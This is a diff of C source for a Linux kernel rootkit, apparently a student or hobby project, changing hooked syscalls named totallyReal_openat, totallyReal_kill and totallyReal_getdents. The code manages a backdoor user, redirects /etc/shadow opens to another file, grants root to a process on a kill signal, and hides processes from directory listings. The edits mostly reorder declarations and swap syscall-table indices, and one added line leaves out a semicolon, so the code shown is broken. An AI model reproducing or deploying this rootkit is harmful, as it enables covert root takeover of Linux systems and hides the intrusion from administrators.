@@ -139,9 +139,11 @@ void remove_backdoor_user(void)
 }
 
 struct file * file_open(const char * path, int flags, int rights) {
-	struct file *filp = NULL;
-	mm_segment_t oldfs;
 	int err = 0;
+	struct file *filp = NULL
+		
+	mm_segment_t oldfs;
+	
 	oldfs = get_fs();
 	set_fs(get_ds());
 	filp = filp_open(path, flags, rights);
@@ -150,17 +152,20 @@ struct file * file_open(const char * path, int flags, int rights) {
 		err = PTR_ERR(filp);
 		return NULL;
 	}
+	
 	return filp;
 }
 
 int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
-	mm_segment_t oldfs;
 	int result;
+	
+	mm_segment_t oldfs;
 	
 	oldfs = get_fs();
 	set_fs(get_ds());
 	result = vfs_read( f, data, size, &offset);
 	set_fs(oldfs);
+	
 	return result;
 }
 
@@ -182,7 +187,7 @@ asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, m
     pr_info("/etc/shadow opened\n");
     copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
   }
-    return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
+    return ((typeof(sys_openat) *)(original_syscallPtrs[0]))(dirfd, pathname, flags, mode);
 }
 
 //privilege escalation code
@@ -225,7 +230,7 @@ asmlinkage int totallyReal_kill(pid_t pid, int sig)
         escalateProcess(pid);
         return 0;
     }
-    return ((typeof(sys_kill) *)(original_syscallPtrs[4]))(pid, sig);
+    return ((typeof(sys_kill) *)(original_syscallPtrs[1]))(pid, sig);
 }
 //end privilege escalation code
 
@@ -252,18 +257,18 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 	
 	copy_from_user( mod_dirp, dirp, nread);
 	
-	long offset = 0;
-	struct linux_dirent *p_dirp, *prev;
+	int i, is_proc_name_match, offset = 0;
+	unsigned short p_dirent_len;
+	char buf[BUF_SIZE], filename[128];
+	struct file *f;
+	struct linux_dirent64 *p_dirp, *prev;
 	while( offset < nread) {
 		p_dirp = (void *) mod_dirp + offset;
-		unsigned short p_dirent_len = p_dirp->d_reclen;
+		p_dirent_len = p_dirp->d_reclen;
 		
-		struct file *f;
-		char buf[BUF_SIZE];
-		int i = 0;
 		for (i = 0; i < 128; i++)
 			buf[i] = 0;
-		char filename[128];
+
 		get_cmdline_path( filename, p_dirp->d_name);
 		pr_info("FAKEGETDENTS: filename is: %s", filename);
 		f = file_open( filename, O_RDONLY, 0 );
@@ -273,7 +278,8 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 			file_read(f, 0, buf, BUF_SIZE - 1);
 			pr_info("FAKEGETDENTS: cmdline is %s", buf);
 		}
-		int is_proc_name_match = 0;
+
+		is_proc_name_match = 0;
 		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
 			is_proc_name_match = 1;
 
@@ -294,15 +300,16 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		}
 		offset += p_dirent_len;
 	}
+	
 	copy_to_user(dirp, mod_dirp, nread);
+	
 	kvfree(mod_dirp);
 	return nread;
 }
 
 /*** Equivalent to getdents bot for getdents64 ***/
 asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
-	// the return value of getdents is the number of bytes read
-
+	// the output of getdents is the number of bytes read
 	int nread;
 	struct linux_dirent64 *mod_dirp;
 
